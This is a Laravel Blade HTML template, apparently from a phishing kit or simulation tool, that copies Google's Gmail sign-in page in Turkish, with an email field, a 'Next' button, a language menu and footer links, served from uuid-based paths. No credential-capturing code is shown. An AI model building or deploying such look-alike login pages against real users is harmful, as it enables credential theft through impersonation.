<html>

<head>
    <link rel="shortcut icon" type="image/x-icon" href="../{{ $uuid }}/img/favicon.png" >
    <title>Gmail</title>
    <link href="{{ asset("$uuid/css/style.css") }}" rel="stylesheet" type="text/css" >
    <link href="{{ asset("$uuid/css/bootstrap.min.css") }}" rel="stylesheet" type="text/css" >
    
</head>

<body>
    <div class="google">
        <img src="../{{$uuid}}/img/google-icon1.jpg" alt="" height="60px" />
        <p id="signIn">Oturum aç</p>
        <p id="toContinue">Google Hesabınızı kullanın
        </p>
        <p>
            <input id="email" type="email" placeholder="E-posta ve Telefon" width="400px;" />
        </p>
        <div id="forGotEmail">
            <a href="#">E-posta adresinizi mi unuttunuz?</a>
            <div id="lowerPart">
                Bu bilgisayar sizin değil mi? Gizli oturum açmak için Misafir modunu kullanın. <a href="#"> Daha fazla bilgi</a>
                <div id="learnMore">

                </div>



            </div>
        </div>



        <br /><br />
        <div id="createAccount">
            <a href="#">Hesap Oluşturun</a>
            <input class="btn btn-primary" id="btnNext" type="button" value="İleri" style="float: right" padding-left="20px" />
        </div>
    </div>
    <br />
    <select margin-left="100px" id="language">
        <option value="af">
            Afrikaans
            </option>
            <option value="az">
            azərbaycan
            </option>
            <option value="in">
            Bahasa Indonesia
            </option>
            <option value="ms">
            Bahasa Melayu
            </option>
            <option value="ca">
            català
            </option>
            <option value="cs">
            Čeština
            </option>
            <option value="da">
            Dansk
            </option>
            <option value="de">
            Deutsch
            </option>
            <option value="et">
            eesti
            </option>
            <option value="en-GB">
            English (United Kingdom)
            </option>
            <option value="en" >
            English (United States)
            </option>
            <option value="es">
            Español (España)
            </option>
            <option value="es-419">
            Español (Latinoamérica)
            </option>
            <option value="eu">
            euskara
            </option>
            <option value="fil">
            Filipino
            </option>
            <option value="fr-CA">
            Français (Canada)
            </option>
            <option value="fr">
            Français (France)
            </option>
            <option value="gl">
            galego
            </option>
            <option value="hr">
            Hrvatski
            </option>
            <option value="zu">
            isiZulu
            </option>
            <option value="is">
            íslenska
            </option>
            <option value="it">
            Italiano
            </option>
            <option value="sw">
            Kiswahili
            </option>
            <option value="lv">
            latviešu
            </option>
            <option value="lt">
            lietuvių
            </option>
            <option value="hu">
            magyar
            </option>
            <option value="nl">
            Nederlands
            </option>
            <option value="no">
            norsk
            </option>
            <option value="pl">
            polski
            </option>
            <option value="pt">
            Português (Brasil)
            </option>
            <option value="pt-PT">
            português (Portugal)
            </option>
            <option value="ro">
            română
            </option>
            <option value="sk">
            Slovenčina
            </option>
            <option value="sl">
            slovenščina
            </option>
            <option value="fi">
            Suomi
            </option>
            <option value="sv">
            Svenska
            </option>
            <option value="vi">
            Tiếng Việt
            </option>
            <option value="tr" selected="selected">
            Türkçe
            </option>
            <option value="el">
            Ελληνικά
            </option>
            <option value="bg">
            български
            </option>
            <option value="mn">
            монгол
            </option>
            <option value="ru">
            Русский
            </option>
            <option value="sr">
            српски
            </option>
            <option value="uk">
            Українська
            </option>
            <option value="ka">
            ქართული
            </option>
            <option value="hy">
            հայերեն
            </option>
            <option value="iw">
            עברית
            </option>
            <option value="ur">
            اردو
            </option>
            <option value="ar">
            العربية
            </option>
            <option value="fa">
            فارسی
            </option>
            <option value="am">
            አማርኛ
            </option>
            <option value="ne">
            नेपाली
            </option>
            <option value="mr">
            मराठी
            </option>
            <option value="hi">
            हिन्दी
            </option>
            <option value="bn">
            বাংলা
            </option>
            <option value="gu">
            ગુજરાતી
            </option>
            <option value="ta">
            தமிழ்
            </option>
            <option value="te">
            తెలుగు
            </option>
            <option value="kn">
            ಕನ್ನಡ
            </option>
            <option value="ml">
            മലയാളം
            </option>
            <option value="si">
            සිංහල
            </option>
            <option value="th">
            ไทย
            </option>
            <option value="lo">
            ລາວ
            </option>
            <option value="km">
            ខ្មែរ
            </option>
            <option value="ko">
            한국어
            </option>
            <option value="zh-HK">
            中文（香港）
            </option>
            <option value="ja">
            日本語
            </option>
            <option value="zh-CN">
            简体中文
            </option>
            <option value="zh-TW">
            繁體中文
            </option>
    </select>
    <font id="footr" size="2.5px" style="margin-bottom: 15px;">
        <a id="help" style="color: #757575; cursor: pointer" href="#">Yardım</a
      >&nbsp;&nbsp;
      <a id="privacy" style="color: #757575; cursor: pointer" href="#"
        >Gizlilik</a
      >&nbsp;&nbsp;
      <a id="terms" style="color: #757575; cursor: pointer" href="#"
        >Şartlar</a
      >
    </font>
  </body>
</html>